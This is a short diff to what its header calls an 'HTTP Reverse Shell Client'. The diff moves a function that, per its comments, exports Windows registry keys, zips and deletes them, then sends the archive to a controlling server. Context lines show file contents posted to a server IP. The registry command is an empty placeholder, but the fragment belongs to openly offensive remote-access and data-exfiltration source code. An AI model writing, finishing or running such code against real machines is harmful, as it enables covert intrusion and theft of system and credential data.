@@ -15,6 +15,13 @@ HTTP Reverse Shell Client
 """
 
 
+def pull_registry():
+    reg_cmd = ''    # single line command to export reg keys, zip the files, delete the files
+    exp_cmd = '^ file_path'  # path to zip file containing reg keys, start with `^ `
+    run_process(reg_cmd)
+    send_file(exp_cmd)
+
+
 def send_file(command):
     """
     Sends requested file back to server
@@ -38,13 +45,6 @@ def send_file(command):
     else:
         post_response = requests.post(
             url=IP, data='[-] Not able to find the file !')
-
-
-def pull_registry():
-    reg_cmd = ''    # single line command to export reg keys, zip the files, delete the files
-    exp_cmd = '^ file_path'  # path to zip file containing reg keys, start with `^ `
-    run_process(reg_cmd)
-    send_file(exp_cmd)
 
 
 def run_process(command):
